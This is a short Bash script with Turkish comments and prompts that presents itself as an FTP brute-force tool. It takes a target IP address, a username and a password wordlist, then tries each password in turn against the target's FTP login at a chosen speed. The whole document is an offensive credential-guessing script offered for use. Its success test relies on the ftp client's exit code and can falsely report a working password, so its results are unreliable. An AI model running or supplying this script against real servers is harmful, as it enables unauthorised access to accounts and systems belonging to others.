#!/bin/bash

# Renk tanımları
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[0;33m'
NC='\033[0m' # No Color

echo -e "${GREEN}Selam dostlar, FTP brute force aracıma hoş geldiniz!${NC}"

# Kullanıcıdan bilgileri al
read -p "Lütfen brute forc yapılacak IP adresini gir: " ip
read -p "Hızı nasıl olsun? (fast/normal/ultra) >> " hız
read -p "Kelime dosyasının yolunu gir >> " word
read -p "Kullanıcı adını gir >> " user

# Hız seçimine göre gecikme ayarı
case $hız in
    fast)
        delay=0.5
        echo -e "${YELLOW}Hız: Fast seçildi.${NC}"
        ;;
    normal)
        delay=1
        echo -e "${YELLOW}Hız: Normal seçildi.${NC}"
        ;;
    ultra)
        delay=0.1
        echo -e "${YELLOW}Hız: Ultra seçildi.${NC}"
        ;;
    *)
        echo -e "${RED}Geçersiz hız seçimi! Varsayılan olarak normal hızda çalışacak.${NC}"
        delay=1
        ;;
esac

# Kullanıcı adı ve kelime dosyasının kontrolü
if [[ -z "$user" || ! -f "$word" ]]; then
    echo -e "${RED}Kullanıcı adı veya şifre dosyası bulunamadı! Lütfen tekrar deneyiniz.${NC}"
    exit 1
fi

# Brute force saldırısını başlat
echo -e "${GREEN}Brute force saldırısı başlatılıyor...${NC}"
while read -r password; do
    echo -e "${YELLOW}Deniyorum: $user / $password${NC}"
    
    # FTP bağlantısını kontrol et
    ftp -n -v $ip <<EOF > /dev/null 2>&1
open $ip
user $user $password
bye
EOF

    # Eğer giriş başarılıysa
    if [[ $? -eq 0 ]]; then
        echo -e "${GREEN}Başarılı giriş! Kullanıcı: $user, Parola: $password${NC}"
        exit 0
    fi
    sleep $delay
done < "$word"

echo -e "${RED}Brute force saldırısı tamamlandı. Başarılı giriş bulunamadı.${NC}"
